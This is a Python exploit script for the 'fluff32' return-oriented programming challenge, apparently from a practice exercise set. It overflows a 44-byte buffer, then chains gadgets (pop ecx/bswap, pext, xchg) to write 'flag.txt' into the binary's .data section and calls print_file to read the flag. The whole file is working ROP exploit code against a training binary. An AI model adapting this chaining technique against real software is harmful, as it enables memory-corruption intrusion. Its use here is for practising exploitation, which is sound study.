import re
import struct
from subprocess import PIPE, Popen

from get_masks import get_masks

ELF_PATH = "./fluff32"

JUNK = b"A" * 44
ZERO = struct.pack("<I", 0)
FILE_NAME = b"flag.txt"

# rabin2 -S ./fluff32 | grep "\-rw\- .data" | awk '{print $4}'
DATA_SECTION_INT = 0x0804A018
# rabin2 -i ./fluff32 | grep print_file | awk '{print $2}'
PRINT_FILE = struct.pack("<I", 0x080483D0)
# ROPgadget --binary ./fluff32 --depth 2 | grep "pop ebp ; ret" | awk '{print $1}'
POP_EBP = struct.pack("<I", 0x080485BB)
# ROPgadget --binary ./fluff32 | grep ": pop ecx ; bswap ecx ; ret" | awk '{print $1}'
POP_ECX_BSWAP_ECX = struct.pack("<I", 0x08048558)
# ROPgadget --binary ./fluff32 | grep ": xchg byte ptr \[ecx\], dl ; ret" | awk '{print $1}'
XCHG_ECXP_DL = struct.pack("<I", 0x08048555)
# mov eax, ebp ; mov ebx, 0xb0bababa ; pext edx, ebx, eax
PEXT = struct.pack("<I", 0x08048543)

MASKS = get_masks(src=0xB0BABABA, dest="flag.txt")
MASKS = [struct.pack("<I", mask) for mask in MASKS]


payload = b""
payload += JUNK


for i in range(8):
    DATA_SECTION = struct.pack(">I", DATA_SECTION_INT + i)
    payload += POP_ECX_BSWAP_ECX + DATA_SECTION
    payload += POP_EBP + MASKS[i]
    payload += PEXT
    payload += XCHG_ECXP_DL


DATA_SECTION = struct.pack("<I", DATA_SECTION_INT)
payload += PRINT_FILE + ZERO + DATA_SECTION


p = Popen(ELF_PATH, stdin=PIPE, stdout=PIPE, stderr=PIPE)
reply = p.communicate(payload)[0].decode()
flag = re.findall(r"ROPE{.+}", reply)[0]
print(flag)
